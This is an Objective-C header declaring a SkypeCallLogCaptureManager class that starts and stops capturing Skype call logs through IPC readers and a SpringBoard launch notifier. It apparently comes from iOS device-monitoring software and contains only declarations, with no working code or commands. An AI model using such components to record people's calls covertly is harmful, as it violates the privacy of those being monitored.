//
//  SkypeCallLogCaptureManager.h
//  SkypeCallLogCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 8/21/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"
#import "SharedFile2IPCReader.h"

@class SBDidLaunchNotifier;
@protocol EventDelegate;

@interface SkypeCallLogCaptureManager : NSObject <MessagePortIPCDelegate, SharedFile2IPCDelegate> {
@private
	id <EventDelegate>		mEventDelegate;
	
	MessagePortIPCReader	*mMessagePortReader1;
	MessagePortIPCReader	*mMessagePortReader2;
	MessagePortIPCReader	*mMessagePortReader3;
	
	SharedFile2IPCReader	*mSharedFileReader1;
	
	SBDidLaunchNotifier		*mSBNotifier;
}

@property (nonatomic, assign) id <EventDelegate> mEventDelegate;

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate;
- (void) startCapture;
- (void) stopCapture;

@end
